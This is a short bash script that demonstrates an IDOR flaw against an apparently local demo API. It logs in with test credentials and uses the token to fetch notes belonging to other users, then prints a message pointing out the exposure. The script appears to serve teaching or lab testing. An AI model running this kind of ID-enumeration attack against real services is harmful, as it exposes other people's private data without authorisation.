#!/bin/bash

BASE_URL="http://127.0.0.1:8000/api"

echo "=== IDOR (Insecure Direct Object Reference) DEMONSTRATION ==="
echo ""

# Login as normal user
echo "Logging in as normal user..."
LOGIN_RESPONSE=$(curl -s -X POST "$BASE_URL/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"123456"}')

TOKEN=$(echo $LOGIN_RESPONSE | jq -r '.token')

echo "Attempting to read Note ID 1 (Alice's shopping list)..."
echo ""
curl -s -X GET "$BASE_URL/notes/1" \
  -H "Authorization: Bearer $TOKEN" | jq '.'

echo ""
echo "Attempting to read Note ID 3 (Bob's bank account)..."
echo ""
curl -s -X GET "$BASE_URL/notes/3" \
  -H "Authorization: Bearer $TOKEN" | jq '.'

echo ""
echo "Notice: You're seeing other users' private notes! This is IDOR."